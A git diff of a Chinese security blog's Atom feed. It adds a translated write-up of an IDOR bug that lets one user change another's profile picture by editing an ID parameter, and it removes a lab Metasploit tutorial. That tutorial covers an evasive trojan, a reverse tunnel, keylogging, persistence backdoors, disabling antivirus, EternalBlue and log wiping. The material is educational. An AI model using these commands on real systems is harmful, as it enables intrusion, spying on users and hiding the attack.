@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-12-18T15:14:14.927Z</updated>
+  <updated>2018-12-19T01:55:59.840Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -14,6 +14,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://TimeS0ng.github.io/2018/12/18/%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AChange%20Anyone%E2%80%99s%20profile%20picture-Exploiting%20IDOR/"/>
+    <id>http://TimeS0ng.github.io/2018/12/18/第一篇翻译：Change Anyone’s profile picture-Exploiting IDOR/</id>
+    <published>2018-12-18T11:08:50.777Z</published>
+    <updated>2018-12-19T01:55:59.840Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="原文：Change-Anyone’s-profile-picture-Exploiting-IDOR"><a href="#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR" class="headerlink" title="原文：Change Anyone’s profile picture-Exploiting IDOR"></a>原文：<a href="https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75" target="_blank" rel="external">Change Anyone’s profile picture-Exploiting IDOR</a></h3><h3 id="漏洞：未授权更改用户信息"><a href="#漏洞：未授权更改用户信息" class="headerlink" title="漏洞：未授权更改用户信息"></a>漏洞：未授权更改用户信息</h3><h3 id="作者：Rupika-Luhach"><a href="#作者：Rupika-Luhach" class="headerlink" title="作者：Rupika Luhach"></a>作者：Rupika Luhach</h3><h3 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h3><h2 id="Hello-Guys"><a href="#Hello-Guys" class="headerlink" title="Hello Guys!!"></a>Hello Guys!!</h2><h4 id="emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"><a href="#emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！" class="headerlink" title="&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"></a>&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！</h4><h2 id="IDOR漏洞："><a href="#IDOR漏洞：" class="headerlink" title="IDOR漏洞："></a>IDOR漏洞：</h2><h4 id="emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"><a href="#emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。" class="headerlink" title="&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"></a>&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。</h4><h4 id="上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"><a href="#上面是专业解释，看完接下来的漏洞复现流程自然就懂了！" class="headerlink" title="[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"></a>[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！</h4><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h4 id="emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者"><a href="#emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者" class="headerlink" title="&emsp;&emsp;1. 首先我创建了两个账号，Rupika Luhach 作为攻击者账号，Test User 充当受害者"></a>&emsp;&emsp;1. 首先我创建了两个账号，<strong>Rupika Luhach</strong> 作为攻击者账号，<strong>Test User</strong> 充当受害者</h4><h4 id="emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85"><a href="#emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85" class="headerlink" title="&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85"></a>&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/1.png" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/2.png" alt=""></p>
+<h4 id="emsp-emsp"><a href="#emsp-emsp" class="headerlink" title="&emsp;&emsp;"></a>&emsp;&emsp;</h4><h4 id="emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85"><a href="#emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85" class="headerlink" title="&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85"></a>&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/3.png" alt=""></p>
+<h4 id="emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了"><a href="#emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了" class="headerlink" title="&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了"></a>&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了</h4><h4 id="初始头像"><a href="#初始头像" class="headerlink" title="[*] 初始头像"></a>[*] 初始头像</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/4.png" alt=""></p>
+<h4 id="篡改后的头像"><a href="#篡改后的头像" class="headerlink" title="[*] 篡改后的头像"></a>[*] 篡改后的头像</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/5.png" alt=""></p>
+<h2 id="视屏演示："><a href="#视屏演示：" class="headerlink" title="视屏演示："></a>视屏演示：</h2><iframe width="560" height="315" src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/videoplayback.mp4" frameborder="0" allowfullscreen></iframe>
+
+
+
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot;&gt;&lt;a href=&quot;#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot; class=&quot;headerlink&quot;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>CVE-2018-8174 漏洞复现</title>
@@ -349,7 +377,7 @@
     <link href="http://TimeS0ng.github.io/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
     <id>http://TimeS0ng.github.io/2018/04/13/Windows-提权基础（上）/</id>
     <published>2018-04-13T09:13:10.000Z</published>
-    <updated>2018-04-13T09:14:31.374Z</updated>
+    <updated>2018-12-18T15:35:08.900Z</updated>
     
     <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><h4 id="本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><a href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。" class="headerlink" title="本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。"></a>本篇教程是笔者翻译国外<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">大牛fuzzysecurity 的文章</a>再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</h4><a id="more"></a>
 <h4 id="Indispensable-Resources"><a href="#Indispensable-Resources" class="headerlink" title="Indispensable Resources:"></a>Indispensable Resources:</h4><ul>
@@ -1173,136 +1201,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;0x00-BDF简介&quot;&gt;&lt;a href=&quot;#0x00-BDF简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. BDF简介&quot;&gt;&lt;/a&gt;0x00. BDF简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot;&gt;&lt;a href=&quot;#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！&lt;/h4&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Metasploit</title>
-    <link href="http://TimeS0ng.github.io/2017/10/08/Metasploit/"/>
-    <id>http://TimeS0ng.github.io/2017/10/08/Metasploit/</id>
-    <published>2017-10-08T15:21:39.000Z</published>
-    <updated>2018-04-18T03:56:21.987Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-Metasploit-Framework简介"><a href="#0x00-Metasploit-Framework简介" class="headerlink" title="0x00. Metasploit Framework简介"></a>0x00. Metasploit Framework简介</h2><h4 id="emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"><a href="#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！" class="headerlink" title="&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"></a>&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！</h4><a id="more"></a>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/WEBRESOURCE3e65a795a3f7fcac430185b407c010bb/2777" alt="image"></p>
-<hr>
-<h2 id="0x01-实战操作"><a href="#0x01-实战操作" class="headerlink" title="0x01. 实战操作"></a>0x01. 实战操作</h2><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><h4 id="1-靶机win-7-emsp-IP-192-168-43-150"><a href="#1-靶机win-7-emsp-IP-192-168-43-150" class="headerlink" title="1. 靶机win 7 &emsp; IP=192.168.43.150"></a>1. 靶机win 7 &emsp; IP=192.168.43.150</h4><h4 id="2-kali-linux-emsp-IP-192-168-43-153"><a href="#2-kali-linux-emsp-IP-192-168-43-153" class="headerlink" title="2. kali linux &emsp; IP=192.168.43.153"></a>2. kali linux &emsp; IP=192.168.43.153</h4><h4 id="3-VPS服务器-emsp-IP-xx-xx-xx-xx"><a href="#3-VPS服务器-emsp-IP-xx-xx-xx-xx" class="headerlink" title="3. VPS服务器 &emsp; IP=xx.xx.xx.xx"></a>3. VPS服务器 &emsp; IP=xx.xx.xx.xx</h4><h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><h3 id="1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"><a href="#1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）" class="headerlink" title="1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"></a>1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）</h3><blockquote>
-<p>vi /etc/ssh/sshd_config &amp;&amp; GatewayPorts:yes</p>
-<p>ssh -CfNg -R xx.xx.xx.xx:2333:192.168.43.153:2333 root@xx.xx.xx.xx -p 29402</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/B0A29DC18557456A8233E113B2E545A7/2805" alt="image"></p>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE26F3A8040346ABAB760ECE9324382F/2786" alt="image"></p>
-<h3 id="2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"><a href="#2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章" class="headerlink" title="2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"></a>2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个<a href="http://www.freebuf.com/sectool/67674.html" target="_blank" rel="external">系列文章</a></h3><blockquote>
-<p>[*]如果想要在docker启动持续监听可以用如下命令</p>
-<p>set exitonsession false &amp;&amp; run -j</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/9CD797025E3C4F73B6249F645BFB89A9/2796" alt="image"></p>
-<h3 id="3-在win-7-中执行木马"><a href="#3-在win-7-中执行木马" class="headerlink" title="3. 在win 7 中执行木马"></a>3. 在win 7 中执行木马</h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/5A6F7DAC4D274B64A4CFD66B0080B835/2803" alt="image"></p>
-<h3 id="4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程"><a href="#4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程" class="headerlink" title="4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程"></a>4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程</h3><blockquote>
-<p>migrate 1988 &amp;&amp; getpid</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6F701A71ADC74D9886456ACAD234579A/2807" alt="image"></p>
-<h3 id="5-查看当前权限、系统信息，并尝试提权"><a href="#5-查看当前权限、系统信息，并尝试提权" class="headerlink" title="5. 查看当前权限、系统信息，并尝试提权"></a>5. 查看当前权限、系统信息，并尝试提权</h3><blockquote>
-<p>getuid &amp;&amp; sysinfo &amp;&amp; getsystem</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/E4A2C214EB80482099D8EC2FAD4EAD5B/2809" alt="image"></p>
-<h3 id="6-查看网络、路由信息"><a href="#6-查看网络、路由信息" class="headerlink" title="6. 查看网络、路由信息"></a>6. 查看网络、路由信息</h3><blockquote>
-<p>ifconfig &amp;&amp; route</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6952617E2F0C487D9961361455423D8F/2811" alt="image"></p>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7BD2DDFFF9C34C97BCC4B83CBBCE460F/2813" alt="image"></p>
-<h3 id="7-监视靶机的桌面"><a href="#7-监视靶机的桌面" class="headerlink" title="7. 监视靶机的桌面"></a>7. 监视靶机的桌面</h3><blockquote>
-<p>run vnc</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1341936A33D348D9BFA015BD4152A84B/2815" alt="image"></p>
-<h3 id="8-启动键盘监听"><a href="#8-启动键盘监听" class="headerlink" title="8. 启动键盘监听"></a>8. 启动键盘监听</h3><blockquote>
-<p>keyscan_start &amp;&amp; keyscan_dump</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1048F53C0DB74D29B1966D4DAEFB375C/2817" alt="image"></p>
-<h3 id="9-设置后门，维持权限"><a href="#9-设置后门，维持权限" class="headerlink" title="9. 设置后门，维持权限"></a>9. 设置后门，维持权限</h3><blockquote>
-<p>run metsvc -A<br>use exploit/multi/handler<br>set payload windows/metsvc_bind_tcp</p>
-</blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115559_zGxh98_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115615_n2yKpJ_Screenshot.jpeg" alt=""></p>
-<h3 id="10-截屏查看靶机当前桌面"><a href="#10-截屏查看靶机当前桌面" class="headerlink" title="10. 截屏查看靶机当前桌面"></a>10. 截屏查看靶机当前桌面</h3><blockquote>
-<p>screenshot</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6AA05CFBB24A4F58B4B4073C76EA86E7/2821" alt="image"></p>
-<h3 id="11-查看当前系统空闲时间"><a href="#11-查看当前系统空闲时间" class="headerlink" title="11. 查看当前系统空闲时间"></a>11. 查看当前系统空闲时间</h3><blockquote>
-<p>idletime</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/79CB8D02C9DE4A5AA6B59C8064C0406B/2823" alt="image"></p>
-<h3 id="12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）"><a href="#12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）" class="headerlink" title="12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）"></a>12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）</h3><blockquote>
-<p>uictl disable keyboard</p>
-<p>uictl disable mouse</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1153DFFD1E3E45148071B6547CF0CB28/2825" alt="image"></p>
-<h3 id="13-查找靶机中重要的敏感文件"><a href="#13-查找靶机中重要的敏感文件" class="headerlink" title="13. 查找靶机中重要的敏感文件"></a>13. 查找靶机中重要的敏感文件</h3><blockquote>
-<p>search -d c:\\ -f payload.exe</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7FA2C1C2A0F9495D853E8DBE84F3F921/2829" alt="image"></p>
-<h3 id="14-指定下载靶机中的文件到本地"><a href="#14-指定下载靶机中的文件到本地" class="headerlink" title="14. 指定下载靶机中的文件到本地"></a>14. 指定下载靶机中的文件到本地</h3><blockquote>
-<p>dowmload&emsp;c:\\Users\\root\\Desktop\\payload.exe&emsp;/root/Desktop</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/D64579685D6946E0A1778127C2DC0C89/2831" alt="image"></p>
-<h3 id="15-上传指定本地文件到靶机中"><a href="#15-上传指定本地文件到靶机中" class="headerlink" title="15. 上传指定本地文件到靶机中"></a>15. 上传指定本地文件到靶机中</h3><blockquote>
-<p>upload&emsp;/root/Desktop/hack.jpeg&emsp;c:\\Users\\root\\Desktop\\payload.exe</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/590D4B293166484BB1B80C740B766889/2833" alt="image"></p>
-<h3 id="16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应"><a href="#16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应" class="headerlink" title="16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应"></a>16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应</h3><blockquote>
-<p>webcam_snap</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/30AFC5056C0C488CAC1B401A54657300/2835" alt="image"></p>
-<h3 id="17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"><a href="#17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面" class="headerlink" title="17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"></a>17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面</h3><blockquote>
-<p>portfwd add -l 3344 -p 3389 -r 127.0.0.1</p>
-</blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418114855_mYPjG6_Screenshot.jpeg" alt=""></p>
-<hr>
-<h1 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02. 后渗透测试"></a>0x02. 后渗透测试</h1><h3 id="1-调用post模块查看当前系统可用的提权模块"><a href="#1-调用post模块查看当前系统可用的提权模块" class="headerlink" title="1. 调用post模块查看当前系统可用的提权模块"></a>1. 调用post模块查看当前系统可用的提权模块</h3><blockquote>
-<p>run post/multi/recon/local_exploit_suggester</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/062DCEF953D0483885263D3B68EA6500/2837" alt="image"></p>
-<h3 id="2-调用payload模块对靶机进行远程桌面操作"><a href="#2-调用payload模块对靶机进行远程桌面操作" class="headerlink" title="2. 调用payload模块对靶机进行远程桌面操作"></a>2. 调用payload模块对靶机进行远程桌面操作</h3><blockquote>
-<p>set payload windows/vncinject/reverse_tcp</p>
-<p>set viewonly no </p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/24C3AE7DA38B47D38AD244E1A85412BD/2839" alt="image"></p>
-<h3 id="3-关掉靶机中的杀软"><a href="#3-关掉靶机中的杀软" class="headerlink" title="3. 关掉靶机中的杀软"></a>3. 关掉靶机中的杀软</h3><blockquote>
-<p>killav</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/98E2F5E758294B1D99BE113B0CDAD0F3/2841" alt="image"></p>
-<h3 id="4-收集靶机浏览器的敏感信息-访问记录、cookie"><a href="#4-收集靶机浏览器的敏感信息-访问记录、cookie" class="headerlink" title="4. 收集靶机浏览器的敏感信息(访问记录、cookie)"></a>4. 收集靶机浏览器的敏感信息(访问记录、cookie)</h3><blockquote>
-<p>run post/windows/gather/enum_ie</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C1568F9B9B8746F990D13D51A9BE3367/2843" alt="image"></p>
-<h3 id="5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions"><a href="#5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions" class="headerlink" title="5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)"></a>5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)</h3><blockquote>
-<p>route add 92.168.43.150 255.255.255.0 3</p>
-<p>use auxiliary/scanner/portscan/tcp</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE904338A187447E9E4C6EB5627C3F3E/2847" alt="image"></p>
-<h3 id="6-扫描一波内网有没有ms17-010漏洞的主机"><a href="#6-扫描一波内网有没有ms17-010漏洞的主机" class="headerlink" title="6. 扫描一波内网有没有ms17_010漏洞的主机"></a>6. 扫描一波内网有没有ms17_010漏洞的主机</h3><blockquote>
-<p>use auxiliary/scanner/smb/smb_ms17_010</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/935810641BBC43FF8EB483C0AD4A2343/2849" alt="image"></p>
-<h3 id="7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波"><a href="#7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波" class="headerlink" title="7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波"></a>7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波</h3><blockquote>
-<p>use exploit/windows/smb/ms17_010_eternalblue</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C4989785A16647D4883A6E243CA78443/2851" alt="image"></p>
-<h3 id="8-在靶机的指定应用中注入恶意代码"><a href="#8-在靶机的指定应用中注入恶意代码" class="headerlink" title="8.在靶机的指定应用中注入恶意代码"></a>8.在靶机的指定应用中注入恶意代码</h3><blockquote>
-<p>use post/windows/manage/peinjector</p>
-</blockquote>
-<h3 id="9-功成身退"><a href="#9-功成身退" class="headerlink" title="9. 功成身退"></a>9. 功成身退</h3><blockquote>
-<p>clearev</p>
-<hr>
-<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"><a href="#emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！" class="headerlink" title="&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"></a>&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！</h4></blockquote>
-]]></content>
-    
-    <summary type="html">
-    
